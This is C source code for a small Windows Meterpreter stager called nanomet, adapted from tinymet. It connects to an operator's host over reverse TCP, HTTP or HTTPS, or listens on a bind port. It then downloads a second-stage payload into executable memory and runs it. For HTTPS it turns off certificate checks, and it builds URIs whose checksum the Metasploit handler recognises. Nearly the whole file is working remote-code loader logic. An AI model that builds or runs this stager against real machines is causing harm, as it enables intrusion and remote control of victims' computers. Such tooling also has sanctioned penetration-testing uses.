/*
Copyright (c) 2014, Vlatko Kosturjak - kost
Based on tinymet by
Copyright (c) 2014, Sherif Eldeeb "eldeeb.net"
All rights reserved.

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions are met:

1. Redistributions of source code must retain the above copyright notice, this
list of conditions and the following disclaimer.
2. Redistributions in binary form must reproduce the above copyright notice,
this list of conditions and the following disclaimer in the documentation
and/or other materials provided with the distribution.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

The views and conclusions contained in the software and documentation are those
of the authors and should not be interpreted as representing official policies,
either expressed or implied, of the FreeBSD Project.
*/
#include <winsock2.h>
#include <wininet.h>
#include <windows.h>
#include <stdio.h>
#include <stdbool.h>

// Globals ...
unsigned long uIP;
unsigned short sPORT;
unsigned char *buf;
unsigned int bufSize;

// Functions ...
void err_exit(char* message){
	printf("\nError: %s\nGetLastError:%ld", message, GetLastError());
	exit(-1);
}

unsigned char TextChecksum8(char* text)
{
	unsigned char temp = 0;
	for (size_t i = 0; i < strlen(text); i++)
	{
		temp += (unsigned char)text[i];
	}
	return temp & 0xff;
}

bool gen_random(size_t buflen, char buf[buflen], unsigned char targetSum) {
	// For this method to work, the buflen must be a multiple of 16, +1.
	if ((buflen % 16) != 1) return false;

	buf[buflen - 1] = 0;

	// Fill buffer with 'P'.
	memset(buf, 'P', buflen - 1);

	// Randomly change half the buffer to '0' chars.
	// After this step, the buffer has a checksum of 0.
	for (int i = 0; i < (buflen-1)/2; i++) {
		size_t idx = rand() % (buflen - 1);
		while (buf[idx] == '0') {
			idx = (idx + 1) % (buflen - 1);
		}
		buf[idx] = '0';
	}

	// Each iteration of this loop increases the checksum by one, and
	// a character chosen at random is changed.
	for (unsigned char i = 0; i < targetSum; i++) {
		// Pick one of the chars in the buf at random.
		size_t idx = rand() % (buflen - 1);

		// If this char can't be increased (because it would no longer
		// be an alphanum), then move on to the next char.
		while (!isalnum(buf[idx]+1)) {
			idx = (idx + 1) % (buflen - 1);
		}

		// Increment.
		buf[idx] ++;
	}

	return true;
}

unsigned char* met_tcp(char* host, char* port, bool bind_tcp)
{
	int rc;
	WSADATA wsaData;

	SOCKET sckt;
	SOCKET cli_sckt;
	SOCKET buffer_socket;

	struct sockaddr_in server;
	struct hostent *hostName;
	int length = 0;
	int location = 0;

	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0){
		err_exit("WSAStartup");
	}

	hostName = gethostbyname(host);

	if (hostName == NULL){
		err_exit("gethostbyname");
	}

	uIP = *(unsigned long*)hostName->h_addr_list[0];
	sPORT = htons(atoi(port));

	server.sin_addr.S_un.S_addr = uIP;
	server.sin_family = AF_INET;
	server.sin_port = sPORT;

	sckt = socket(AF_INET, SOCK_STREAM, 0);

	if (sckt == INVALID_SOCKET){
		err_exit("socket()");
	}

	//////////////////////////////
	if (bind_tcp){
		rc = bind(sckt, (struct sockaddr *)&server,
			  sizeof(struct sockaddr));
		if (rc != 0) {
			err_exit("bind()");
		}
		if (listen(sckt, SOMAXCONN) != 0) {
			err_exit("listen()");
		}
		if ((cli_sckt = accept(sckt, NULL, NULL)) == INVALID_SOCKET)
		{
			err_exit("accept()");
		}
		buffer_socket = cli_sckt;
	}
	//
	else {
		if (connect(sckt, (struct sockaddr*)&server, sizeof(server)) != 0){
			err_exit("connect()");
		}
		buffer_socket = sckt;
	}
	//////////////////////////////
	// When reverse_tcp and bind_tcp are used, the multi/handler sends the
	// size of the stage in the first 4 bytes before the stage itself.
	// So, we read first 4 bytes to use it for memory allocation
	// calculations.
	recv(buffer_socket, (char*)&bufSize, 4, 0);

	buf = (unsigned char*)VirtualAlloc(buf, bufSize + 5, MEM_COMMIT,
					   PAGE_EXECUTE_READWRITE);

	// Q: why did we allocate bufsize+5? what's those extra 5 bytes?
	// A: the stage is a large shellcode "ReflectiveDll", and when the
	// stage gets executed, IT IS EXPECTING TO HAVE THE SOCKET NUMBER
	// IN _EDI_ register.
	//    so, we want the following to take place BEFORE executing the
	// stage: "mov edi, [socket]"
	//    opcode for "mov edi, imm32" is 0xBF

	buf[0] = 0xbf; // opcode of "mov edi, [WhateverFollows]
	memcpy(buf + 1, &buffer_socket, 4); // got it?

	length = bufSize;
	while (length != 0){
		int received = 0;
		received = recv(buffer_socket, ((char*)(buf + 5 + location)),
				length, 0);
		location = location + received;
		length = length - received;
	}
	//////////////////////////////
	return buf;
}

unsigned char* rev_http(char* host, char* port, bool WithSSL){
	// Steps:
	//	1) Calculate a random URI->URL with `valid` checksum; that is
	// needed for the multi/handler to distinguish and identify various
	// framework related requests "i.e. coming from stagers" ... we'll be
	// asking for checksum==92 "INITM", which will get the patched stage in
	// return.
	//	2) Decide about whether we're reverse_http or reverse_https,
	// and set flags appropriately.
	//	3) Prepare buffer for the stage with WinInet: InternetOpen,
	// InternetConnect, HttpOpenRequest, HttpSendRequest, InternetReadFile.
	//	4) Return pointer to the populated buffer to caller function.
	//***************************************************************//

	// Variables
	char URI[17] = { 0 };	//4 chars ... it can be any length actually.
	char FullURL[sizeof(URI)+1] = { 0 };	// FullURL is ("/" + URI)
	unsigned char* buffer = NULL;
	DWORD flags = 0;
	int dwSecFlags = 0;

	HINTERNET hInternetOpen;
	HINTERNET hInternetConnect;
	HINTERNET hHTTPOpenRequest;
	bool bKeepReading;
	DWORD dwBytesRead;
	DWORD dwBytesWritten;

	//	Step 1: Calculate a random URI->URL with `valid` checksum;
	// that is needed for the multi/handler to distinguish and identify
	// various framework related requests "i.e. coming from stagers" ...
	// we'll be asking for checksum==92 "INITM", which will get the patched
	// stage in return.
	srand(GetTickCount());
	// Generate a random string.
	gen_random(sizeof(URI), URI, 92);
	strcpy(FullURL, "/");
	strcat(FullURL, URI);

	//	2) Decide about whether we're reverse_http or reverse_https,
	// and set flags appropriately.
	if (WithSSL) {
		flags = (INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE |
		INTERNET_FLAG_NO_AUTO_REDIRECT | INTERNET_FLAG_NO_UI |
		INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID |
		INTERNET_FLAG_IGNORE_CERT_DATE_INVALID |
		SECURITY_FLAG_IGNORE_UNKNOWN_CA);
	}
	else {
		flags = (INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE |
		INTERNET_FLAG_NO_AUTO_REDIRECT | INTERNET_FLAG_NO_UI);
	}

	//	3) Prepare buffer for the stage with WinInet:
	//	   InternetOpen, InternetConnect, HttpOpenRequest,
	// HttpSendRequest, InternetReadFile.

	hInternetOpen = InternetOpen(
		"Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)",
		INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (hInternetOpen == NULL){
		err_exit("InternetOpen()");
	}

	// 3.2: InternetConnect
	hInternetConnect = InternetConnect(hInternetOpen, host, atoi(port),
		NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
	if (hInternetConnect == NULL){
		err_exit("InternetConnect()");
	}

	// 3.3: HttpOpenRequest
	hHTTPOpenRequest = HttpOpenRequest(hInternetConnect, "GET", FullURL,
		NULL, NULL, NULL, flags, 0);
	if (hHTTPOpenRequest == NULL){
		err_exit("HttpOpenRequest()");
	}

	// 3.4: if (SSL)->InternetSetOption
	if (WithSSL){
		dwSecFlags = SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
			SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
			SECURITY_FLAG_IGNORE_WRONG_USAGE |
			SECURITY_FLAG_IGNORE_UNKNOWN_CA |
			SECURITY_FLAG_IGNORE_REVOCATION;
		InternetSetOption(hHTTPOpenRequest,
		INTERNET_OPTION_SECURITY_FLAGS, &dwSecFlags,
			sizeof(dwSecFlags));
	}

	// 3.5: HttpSendRequest
	if (!HttpSendRequest(hHTTPOpenRequest, NULL, 0, NULL, 0))
	{
		err_exit("HttpSendRequest()");
	}

	// 3.6: VirtualAlloc enough memory for the stage ... 4MB are more than enough
	buffer = (unsigned char*)VirtualAlloc(NULL, (4 * 1024 * 1024),
		MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	// 3.7: InternetReadFile: keep reading till nothing is left.

	bKeepReading = TRUE;
	dwBytesRead = -1;
	dwBytesWritten = 0;
	while (bKeepReading && dwBytesRead != 0)
	{
		bKeepReading = InternetReadFile(hHTTPOpenRequest,
			(buffer + dwBytesWritten), 4096, &dwBytesRead);
		dwBytesWritten += dwBytesRead;
	}

	//	4) Return pointer to the populated buffer to caller function.
	return buffer;
}

int mainw (int argc, char *argv[])
{

	char* TRANSPORT;
	char* LHOST;
	char* LPORT;

	char helpText[] = "nanomet v0.1\ngithub.com/kost/nanomet\n\n"
		"Usage: nanomet.exe [transport] LHOST LPORT\n"
		"Available transports are as follows:\n"
		"    0: reverse_tcp\n"
		"    1: reverse_http\n"
		"    2: reverse_https\n"
		"    3: bind_tcp\n"
		"\nExample:\n"
		"\"nanomet.exe 2 host.com 443\"\n"
		"will use reverse_https and connect to host.com:443\n";

	if ((argc<=2) || (argc==2 && strcmp(argv[1],"--help")==0)) {
		printf(helpText);
		exit(-1);
	}
	TRANSPORT = argv[1];
	LHOST = argv[2];
	LPORT = argv[3];
	printf("T:%s H:%s P:%s\n", TRANSPORT, LHOST, LPORT);

	// pick transport ...
	switch (TRANSPORT[0]) {
	case '0':
		buf = met_tcp(LHOST, LPORT, FALSE);
		break;
	case '1':
		buf = rev_http(LHOST, LPORT, FALSE);
		break;
	case '2':
		buf = rev_http(LHOST, LPORT, TRUE);
		break;
	case '3':
		buf = met_tcp(LHOST, LPORT, TRUE);
		break;
	default:
		printf(helpText);
		err_exit("Transport should be 0,1,2 or 3");
	}

	(*(void(*)())buf)();
	exit(0);
}

#ifdef WINDOWSMAIN
int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{

	mainw(__argc, __argv);
	return 0;
}
#else
int main (int argc, char *argv[])
{
	mainw(argc,argv);
}
#endif
